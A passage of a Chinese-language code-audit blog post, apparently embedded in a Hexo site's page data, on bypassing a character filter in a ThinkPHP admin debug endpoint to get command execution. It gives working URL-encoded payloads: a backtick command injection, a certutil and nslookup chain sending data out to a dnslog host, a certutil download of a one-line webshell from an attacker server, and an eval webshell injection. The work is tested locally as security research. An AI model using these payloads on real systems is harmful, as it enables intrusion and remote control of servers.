alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">debug</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$path</span> = <span class=\"string\">&#x27;app/extra/debug.php&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$file</span> = <span class=\"keyword\">include</span> <span class=\"variable\">$path</span>; </span><br><span class=\"line\">        <span class=\"variable\">$config</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">         <span class=\"string\">&#x27;name&#x27;</span> =&gt; input(<span class=\"string\">&#x27;id&#x27;</span>),</span><br><span class=\"line\">        );</span><br><span class=\"line\">        <span class=\"variable\">$config</span> = preg_replace(<span class=\"string\">&quot;/[?&gt;&lt;?]/&quot;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$config</span>);</span><br><span class=\"line\">        <span class=\"variable\">$res</span> = array_merge(<span class=\"variable\">$file</span>, <span class=\"variable\">$config</span>);</span><br><span class=\"line\">        <span class=\"variable\">$str</span> = <span class=\"string\">&#x27;&lt;?php return [&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"variable\">$res</span> <span class=\"keyword\">as</span> <span class=\"variable\">$key</span> =&gt; <span class=\"variable\">$value</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$str</span> .= <span class=\"string\">&#x27;\\&#x27;&#x27;</span> . <span class=\"variable\">$key</span> . <span class=\"string\">&#x27;\\&#x27;&#x27;</span> . <span class=\"string\">&#x27;=&gt;&#x27;</span> . <span class=\"string\">&#x27;\\&#x27;&#x27;</span> . <span class=\"variable\">$value</span> . <span class=\"string\">&#x27;\\&#x27;&#x27;</span> . <span class=\"string\">&#x27;,&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$str</span> .= <span class=\"string\">&#x27;]; &#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (file_put_contents(<span class=\"variable\">$path</span>, <span class=\"variable\">$str</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> json(<span class=\"keyword\">array</span>(<span class=\"string\">&#x27;code&#x27;</span> =&gt; <span class=\"number\">1</span>, <span class=\"string\">&#x27;msg&#x27;</span> =&gt; <span class=\"string\">&#x27;操作成功&#x27;</span>));</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> json(<span class=\"keyword\">array</span>(<span class=\"string\">&#x27;code&#x27;</span> =&gt; <span class=\"number\">0</span>, <span class=\"string\">&#x27;msg&#x27;</span> =&gt; <span class=\"string\">&#x27;操作失败&#x27;</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>在代码第15行通过file_put_contents()函数将id传参的内容写入到app/extra/debug.php文件中。<br>2、可以看到上面进行了一些过滤，将&lt;&gt;和?替换为空</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$config</span> = preg_replace(<span class=\"string\">&quot;/[?&gt;&lt;?]/&quot;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$config</span>);</span><br></pre></td></tr></table></figure>\n<p>3、这里直接将不太清晰，实战演示一下，首先访问后台路径，这里有个debug功能，就是上面debug函数的功能点。<br><a href=\"http://127.0.0.1/index.php/admin/\">http://127.0.0.1/index.php/admin/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973358124-c7069db1-627c-4b05-8d15-255493426fee.png#align=left&display=inline&height=378&margin=%5Bobject%2Object%5D&name=image.png&originHeight=756&originWidth=2250&size=114711&status=done&style=none&width=1125\" alt=\"image.png\"><br>4、具体使用时发现报错了，那就直接访问对应的函数，路由规则就是/index.php/目录-文件-函数.html?传参=。<br>这里我传参123进行测试<br><a href=\"http://127.0.0.1/index.php/admin-api-debug.html?id=123\">http://127.0.0.1/index.php/admin-api-debug.html?id=123</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973462857-ae631d20-59ff-4a98-bb1d-6702c09d8311.png#align=left&display=inline&height=227&margin=%5Bobject%2Object%5D&name=image.png&originHeight=454&originWidth=1120&size=27749&status=done&style=none&width=560\" alt=\"image.png\"><br>5、在debug.php文件中可以看到123是放到数组中的值处，而我们可以控制这里的值。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973579521-fd2d20ba-4b8c-46b5-9edf-654fb073cfed.png#align=left&display=inline&height=97&margin=%5Bobject%2Object%5D&name=image.png&originHeight=194&originWidth=810&size=11511&status=done&style=none&width=405\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">return</span> [<span class=\"string\">&#x27;name&#x27;</span>=&gt;<span class=\"string\">&#x27;123&#x27;</span>,]; </span><br></pre></td></tr></table></figure>\n<p>6、下面讲解我进行绕过的思路以及遇到的坑。</p>\n<h1 id=\"0x05-绕过思路\"><a href=\"#0x05-绕过思路\" class=\"headerlink\" title=\"0x05 绕过思路\"></a>0x05 绕过思路</h1><h2 id=\"第一次踩坑\"><a href=\"#第一次踩坑\" class=\"headerlink\" title=\"第一次踩坑\"></a>第一次踩坑</h2><p>1、首先，这里因为没有过滤单引号和中括号，所以我们可以手动闭合</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\">http:<span class=\"comment\">//127.0.0.1/index.php/admin-api-debug.html?id=123%27];phpinfo();//</span></span><br></pre></td></tr></table></figure>\n<p>这里可以看到数据是成功写入进文件中的<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973910607-7d1ffe2f-30b8-406c-9ec6-a7f233aa1838.png#align=left&display=inline&height=131&margin=%5Bobject%2Object%5D&name=image.png&originHeight=262&originWidth=1138&size=17735&status=done&style=none&width=569\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">return</span> [<span class=\"string\">&#x27;name&#x27;</span>=&gt;<span class=\"string\">&#x27;123&#x27;</span>];phpinfo();<span class=\"comment\">//&#x27;,]; </span></span><br></pre></td></tr></table></figure>\n<p>2、访问debug.php文件试试发现，页面并没有返回想要的内容<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973998766-06dfe807-2a84-4b08-9d12-f6f666c5d553.png#align=left&display=inline&height=363&margin=%5Bobject%2Object%5D&name=image.png&originHeight=726&originWidth=1882&size=36793&status=done&style=none&width=941\" alt=\"image.png\"><br>3、这里我想了好久，想着试试更换echo输出看看<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974252476-7716d00d-14a0-4716-b201-a544a6f60a7b.png#align=left&display=inline&height=131&margin=%5Bobject%2Object%5D&name=image.png&originHeight=262&originWidth=1216&size=17745&status=done&style=none&width=608\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">return</span> [<span class=\"string\">&#x27;name&#x27;</span>=&gt;<span class=\"string\">&#x27;123&#x27;</span>];<span class=\"keyword\">echo</span> <span class=\"string\">&#x27;12344321&#x27;</span>;<span class=\"comment\">//&#x27;,]; </span></span><br></pre></td></tr></table></figure>\n<p>在页面中并没有输出<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974272002-aae9ec72-7aef-4da2-9334-3b1d52dd1fdc.png#align=left&display=inline&height=349&margin=%5Bobject%2Object%5D&name=image.png&originHeight=698&originWidth=1572&size=32195&status=done&style=none&width=786\" alt=\"image.png\"><br>4、查阅资料之后理解了return后代码不再向下执行，此路不通<br>参考链接：<a href=\"https://www.cnblogs.com/gzpu/p/13736420.html\">https://www.cnblogs.com/gzpu/p/13736420.html</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974368673-8697062b-c811-4893-8104-93859af43ce4.png#align=left&display=inline&height=360&margin=%5Bobject%2Object%5D&name=image.png&originHeight=720&originWidth=1780&size=173801&status=done&style=none&width=890\" alt=\"image.png\"></p>\n<h2 id=\"第二次踩坑\"><a href=\"#第二次踩坑\" class=\"headerlink\" title=\"第二次踩坑\"></a>第二次踩坑</h2><p>1、既然不能通过分号结束代码后执行其他代码的话，我能不能在return中执行代码呢，此处进行了尝试<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974559232-6d36dadf-930e-47a1-9480-1ec1a7fedfff.png#align=left&display=inline&height=166&margin=%5Bobject%2Object%5D&name=image.png&originHeight=332&originWidth=1320&size=21063&status=done&style=none&width=660\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">return</span> [<span class=\"string\">&#x27;name&#x27;</span>=&gt;<span class=\"string\">&#x27;123&#x27;</span>,<span class=\"keyword\">eval</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"number\">1</span>]);<span class=\"string\">&#x27;&#x27;</span>,]; </span><br></pre></td></tr></table></figure>\n<p>于是……页面报错了<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974695282-85560a7a-e2ed-420b-a587-3fca009fce13.png#align=left&display=inline&height=208&margin=%5Bobject%2Object%5D&name=image.png&originHeight=416&originWidth=1896&size=51008&status=done&style=none&width=948\" alt=\"image.png\"><br>2、再试试换行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//127.0.0.1/index.php/admin-api-debug.html?id=123%27,%0aeval($_REQUEST[1]);%27</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974633748-97685352-f49d-473f-8a3b-2bee5cd0f9f9.png#align=left&display=inline&height=255&margin=%5Bobject%2Object%5D&name=image.png&originHeight=510&originWidth=1766&size=41682&status=done&style=none&width=883\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974665241-8ade3301-0ef4-4c8e-81c7-ed35aaf695d6.png#align=left&display=inline&height=149&margin=%5Bobject%2Object%5D&name=image.png&originHeight=298&originWidth=774&size=17721&status=done&style=none&width=387\" alt=\"image.png\"><br>好的，还是不执行<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974689654-d9f1edad-993c-47cf-bd87-4a90e81ca765.png#align=left&display=inline&height=208&margin=%5Bobject%2Object%5D&name=image.png&originHeight=416&originWidth=1896&size=51008&status=done&style=none&width=948\" alt=\"image.png\"></p>\n<h2 id=\"第三次，渐渐好起来了\"><a href=\"#第三次，渐渐好起来了\" class=\"headerlink\" title=\"第三次，渐渐好起来了\"></a>第三次，渐渐好起来了</h2><p>1、因为代码执行行不通，那我就想着试试命令执行看可不可以。先申请一个dnslog，链接：<a href=\"http://dnslog.cn/\">http://dnslog.cn/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627975381688-d15ad1b7-76f1-415d-bcd7-e22aa5ba1eb6.png#align=left&display=inline&height=368&margin=%5Bobject%2Object%5D&name=image.png&originHeight=736&originWidth=1678&size=96742&status=done&style=none&width=839\" alt=\"image.png\"><br>2、使用.拼接反引号执行命令</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//127.0.0.1/index.php/admin-api-debug.html?id=123%27].`ping%20123.yh6nta.dnslog.cn`;//</span></span><br></pre></td></tr></table></figure>\n<p>查看文件情况<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627975963563-5fcf69e0-c0a5-4b5c-a539-91dc15f8ed2b.png#align=left&display=inline&height=130&margin=%5Bobject%2Object%5D&name=image.png&originHeight=260&originWidth=1520&size=21022&status=done&style=none&width=760\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">return</span> [<span class=\"string\">&#x27;name&#x27;</span>=&gt;<span class=\"string\">&#x27;123&#x27;</span>].`ping <span class=\"number\">123</span>.yh6nta.dnslog.cn`;<span class=\"comment\">//&#x27;,]; </span></span><br></pre></td></tr></table></figure>\n<p>访问看看，发现报错了，但是dnslog记录了数据，命令执行成功了<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627975999637-a25ee21b-1180-4e35-b011-5cfd6aa1b280.png#align=left&display=inline&height=205&margin=%5Bobject%2Object%5D&name=image.png&originHeight=410&originWidth=1638&size=42918&status=done&style=none&width=819\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976022017-93c02bcb-6de0-4975-9a73-97abf75fcd0d.png#align=left&display=inline&height=243&margin=%5Bobject%2Object%5D&name=image.png&originHeight=486&originWidth=1562&size=52679&status=done&style=none&width=781\" alt=\"image.png\"></p>\n<p>3、这里报错怀疑是使用了点进行拼接，两边的字符类型不匹配，因为命令执行可以使用符号进行连接，所以在这里将点替换成&amp;。<br>因为&amp;在url中还有其他含义，所以先进行url编码。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">123</span><span class=\"string\">&#x27;]&amp;`ping 123.yh6nta.dnslog.cn`;//</span></span><br><span class=\"line\"><span class=\"string\">#url编码</span></span><br><span class=\"line\"><span class=\"string\">123%27%5D%26%60ping%20123.yh6nta.dnslog.cn%60%3B%2F%2F</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//127.0.0.1/index.php/admin-api-debug.html?id=123%27%5D%26%60ping%20123.yh6nta.dnslog.cn%60%3B%2F%2F</span></span><br></pre></td></tr></table></figure>\n<p>查看文件情况<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976148195-6af4632a-25e2-4522-b675-1534d18406cb.png#align=left&display=inline&height=157&margin=%5Bobject%2Object%5D&name=image.png&originHeight=314&originWidth=1460&size=22879&status=done&style=none&width=730\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">return</span> [<span class=\"string\">&#x27;name&#x27;</span>=&gt;<span class=\"string\">&#x27;123&#x27;</span>]&amp;`ping <span class=\"number\">123</span>.yh6nta.dnslog.cn`;<span class=\"comment\">//&#x27;,]; </span></span><br></pre></td></tr></table></figure>\n<p>访问debug.php文件，页面没有报错，而且dnslog成功回显<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976190829-597fc4be-908f-4c66-a852-bdc93422099e.png#align=left&display=inline&height=212&margin=%5Bobject%2Object%5D&name=image.png&originHeight=424&originWidth=1048&size=19358&status=done&style=none&width=524\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976225056-8a0f56dd-89e0-44fd-8bda-f6c928a1ffb3.png#align=left&display=inline&height=324&margin=%5Bobject%2Object%5D&name=image.png&originHeight=648&originWidth=1636&size=71050&status=done&style=none&width=818\" alt=\"image.png\"><br>4、既然可以执行命令了，很明显这里是无回显的情况，那么怎么拿到shell呢<br>PHP无回显情况下的渗透测试可以参考此文章：<br><a href=\"https://xz.aliyun.com/t/9916\">https://xz.aliyun.com/t/9916</a></p>\n<h3 id=\"Linux系统\"><a href=\"#Linux系统\" class=\"headerlink\" title=\"Linux系统\"></a>Linux系统</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这里不细说，只要命令没有&lt;、&gt;、?即可</span><br><span class=\"line\"><span class=\"number\">1</span>、nc反弹shell</span><br><span class=\"line\"><span class=\"number\">2</span>、配合其他组件，如redis等</span><br><span class=\"line\"><span class=\"number\">3</span>、等等～</span><br></pre></td></tr></table></figure>\n<h3 id=\"Windows系统\"><a href=\"#Windows系统\" class=\"headerlink\" title=\"Windows系统\"></a>Windows系统</h3><h4 id=\"1、第一次尝试\"><a href=\"#1、第一次尝试\" class=\"headerlink\" title=\"1、第一次尝试\"></a>1、第一次尝试</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">使用`ping `whoami`.yh6nta.dnslog.cn`，失败</span><br><span class=\"line\">使用`ping /`whoami/`.yh6nta.dnslog.cn`，失败</span><br><span class=\"line\">使用`ping %系统变量%.yh6nta.dnslog.cn`，失败</span><br></pre></td></tr></table></figure>\n<h4 id=\"2、第二次尝试\"><a href=\"#2、第二次尝试\" class=\"headerlink\" title=\"2、第二次尝试\"></a>2、第二次尝试</h4><p>使用系统命令外带数据，首先我在文件中直接修改，发现可以成功外带数据</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">return</span> [<span class=\"string\">&#x27;name&#x27;</span>=&gt;<span class=\"string\">&#x27;123&#x27;</span>]&amp;`cmd /c whoami &gt; temp &amp;&amp; certutil -encode -f temp temp&amp;&amp;<span class=\"keyword\">FOR</span> /F <span class=\"string\">&quot;eol=- delims=&quot;</span> %i IN (temp) <span class=\"keyword\">DO</span> (set _=%i &amp; cmd /c nslookup %_:~<span class=\"number\">0</span>,-<span class=\"number\">1</span>%.yh6nta.dnslog.cn)&amp;del temp`;<span class=\"comment\">//&#x27;,]; </span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977290414-50582704-a650-4082-a41a-cf9a1665b9b9.png#align=left&display=inline&height=207&margin=%5Bobject%2Object%5D&name=image.png&originHeight=414&originWidth=1540&size=39360&status=done&style=none&width=770\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977306573-d1cd453b-5141-4d0b-9168-b691f744965b.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&name=image.png&originHeight=292&originWidth=1470&size=47685&status=done&style=none&width=735\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977330429-234914f7-3549-4c6c-a3b9-6167a5649897.png#align=left&display=inline&height=338&margin=%5Bobject%2Object%5D&name=image.png&originHeight=676&originWidth=1130&size=61783&status=done&style=none&width=565\" alt=\"image.png\"><br>后面发现，这条命令中含有一个&gt;号，苦恼好久，暂时放弃。不过我觉得这个命令可以适当优化，然后就可以使用了。</p>\n<h4 id=\"3、第三次尝试，成功getshell\"><a href=\"#3、第三次尝试，成功getshell\" class=\"headerlink\" title=\"3、第三次尝试，成功getshell\"></a>3、第三次尝试，成功getshell</h4><p>这里借鉴了XX师傅的建议，通过命令下载文件getshell</p>\n<p>1、首先需要准备一个文件，内容为一句话木马，放到vps的web服务中。（当然起一个python的http服务也可以，主要是要可以访问获取。）</p>\n<p>2、windows中可以使用certutil下载文件</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#payload：</span></span><br><span class=\"line\"><span class=\"string\">&#x27;]&amp;`certutil -urlcache -split -f http://vps地址:83/shell 1.php`;//</span></span><br><span class=\"line\"><span class=\"string\">#url编码：</span></span><br><span class=\"line\"><span class=\"string\">%27%5D%26%60certutil%20-urlcache%20-split%20-f%20http%3A%2F%2Fvps地址%3A83%2Fshell%201.php%60%3B%2F%2F</span></span><br><span class=\"line\"><span class=\"string\">#通过id传参：</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/index.php/admin-api-debug.html?id=%27%5D%26%60certutil%20-urlcache%20-split%20-f%20http%3A%2F%2Fvps地址%3A83%2Fshell%201.php%60%3B%2F%2F</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977842733-531b6b12-9c1d-437f-b7eb-43c9f4d2f586.png#align=left&display=inline&height=324&margin=%5Bobject%2Object%5D&name=image.png&originHeight=648&originWidth=1924&size=52188&status=done&style=none&width=962\" alt=\"image.png\"><br>3、查看debug.php文件情况<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977879453-9011b19e-b726-40d9-8d0b-d2f3f11814b6.png#align=left&display=inline&height=170&margin=%5Bobject%2Object%5D&name=image.png&originHeight=340&originWidth=1370&size=27921&status=done&style=none&width=685\" alt=\"image.png\"><br>4、访问debug.php后，会在当前目录生成1.php，内容为一句话木马<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627978056537-80fdfb3f-2da0-4272-86ce-13fc3301fe3c.png#align=left&display=inline&height=270&margin=%5Bobject%2Object%5D&name=image.png&originHeight=540&originWidth=1340&size=52951&status=done&style=none&width=670\" alt=\"image.png\"><br>5、执行phpinfo函数<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627978130967-fe3d3a57-3439-4ae1-93af-1f1c0df55acb.png#align=left&display=inline&height=423&margin=%5Bobject%2Object%5D&name=image.png&originHeight=846&originWidth=2230&size=218961&status=done&style=none&width=1115\" alt=\"image.png\"></p>\n<h2 id=\"原来竟然如此简单？\"><a href=\"#原来竟然如此简单？\" class=\"headerlink\" title=\"原来竟然如此简单？\"></a>原来竟然如此简单？</h2><p>1、因为前面命令执行可以使用符号进行连接，我想着在代码中也试试，看看能不能直接执行一句话木马（测试了｜、｜｜、&amp;、&amp;&amp;，只有&amp;和&amp;&amp;的时候可以执行）<br>同样先进行url编码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">123</span><span class=\"string\">&#x27;]&amp;&amp;eval($_REQUEST[1]);//</span></span><br><span class=\"line\"><span class=\"string\">#url编码</span></span><br><span class=\"line\"><span class=\"string\">123%27%5D%26%26eval(%24_REQUEST%5B1%5D)%3B%2F%2F</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//127.0.0.1/index.php/admin-api-debug.html?id=123%27%5D%26%26eval(%24_REQUEST%5B1%5D)%3B%2F%2F</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974884495-55623576-d417-48df-b872-bf0ba605d607.png#align=left&display=inline&height=248&margin=%5Bobject%2Object%5D&name=image.png&originHeight=496&originWidth=1940&size=47452&status=done&style=none&width=970\" alt=\"image.png\"><br>在文件中是这样的<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974919229-adbc9a6d-0ff1-4971-96e4-a0a08b7064a5.png#align=left&display=inline&height=123&margin=%5Bobject%2Object%5D&name=image.png&originHeight=246&originWidth=1288&size=19624&status=done&style=none&width=644\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">return</span> [<span class=\"string\">&#x27;name&#x27;</span>=&gt;<span class=\"string\">&#x27;123&#x27;</span>]&amp;&amp;<span class=\"keyword\">eval</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"number\">1</span>]);<span class=\"comment\">//&#x27;,]; </span></span><br></pre></td></tr></table></figure>\n<p>尝试访问，成功执行代码<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974971491-f1514597-7cb7-43ac-a727-8c191adf1d0e.png#align=left&display=inline&height=497&margin=%5Bobject%2Object%5D&name=image.png&originHeight=994&originWidth=2474&size=252996&status=done&style=none&width=1237\" alt=\"image.png\"><br>居然就这样就可以了……</p>\n<h1 id=\"0x06-总结\"><a href=\"#0x06-总结\" class=\"headerlink\" title=\"0x06 总结\"></a>0x06 总结</h1><p>本次代码审计发现漏洞很快，但是利用起来整了我2天，还是在师傅们的帮助下完成的深入利用。忽然发现自己对于编程语言的基础还很不扎实，一些简单处理的地方居然思考了那么久，在之前发现漏洞的情况下，一般都是可以直接利用了，此次bypass的时候发现了很多不足。在以后的代码审计中，简单利用的漏洞只会越来越少，我还需要多深入学习代码知识，才能从一些过滤薄弱点出发，发现漏洞。嗯嗯，总结一句话，不论是学什么东西，基础很重要很重要！</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<blockquote>\n<p>本文已发布到先知社区：<a href=\"https://xz.aliyun.com/t/9990\">https://xz.aliyun.com/t/9990</a></p>\n<p>作者：ajie</p>\n</blockquote>\n<h1 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h1><p>闲来无事挖挖漏洞，发现一个经过了一些过滤的漏洞，踩了无数的坑，然后冥思苦想了许多方法，终于找到了一个点，使得可以进行命令执行与getshell。这里的漏洞点不值一提，但是因为绕过方法挺好玩的，故在这里分享一下思路，大佬勿喷～<br>思路不唯一，也希望有其他方法的话，大佬们可以不吝赐教，在评论区留下具体方法，谢谢大家～</p>\n<h1 id=\"0x02-代码审计环境\"><a href=\"#0x02-代码审计环境\" class=\"headerlink\" title=\"0x02 代码审计环境\"></a>0x02 代码审计环境</h1><p>此次代码审计采用的是phpstudy一键式搭建。<br>phpstudy下载地址：<a href=\"https://www.xp.cn/download.html\">https://www.xp.cn/download.html</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627971325439-22769cc2-8d3c-41a2-8185-4678214b0b6b.png\" alt=\"image.png\"><br>代码审计分析工具：nopad++，seay源代码分析工具<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627971466153-651305cf-f199-4ad4-86c8-9599bda20d95.png#align=left&display=inline&height=486&margin=%5Bobject%2Object%5D&name=image.png&originHeight=972&originWidth=2022&size=139166&status=done&style=none&width=1011\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627971389181-eb803d39-5a81-48d8-ac70-ffc28257b6da.png#align=left&display=inline&height=571&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1142&originWidth=2388&size=356754&status=done&style=none&width=1194\" alt=\"image.png\"></p>\n<h1 id=\"0x03-开始审计\"><a href=\"#0x03-开始审计\" class=\"headerlink\" title=\"0x03 开始审计\"></a>0x03 开始审计</h1><p>话不多说，先看一下目录结构，很明显的tp5框架<br><img 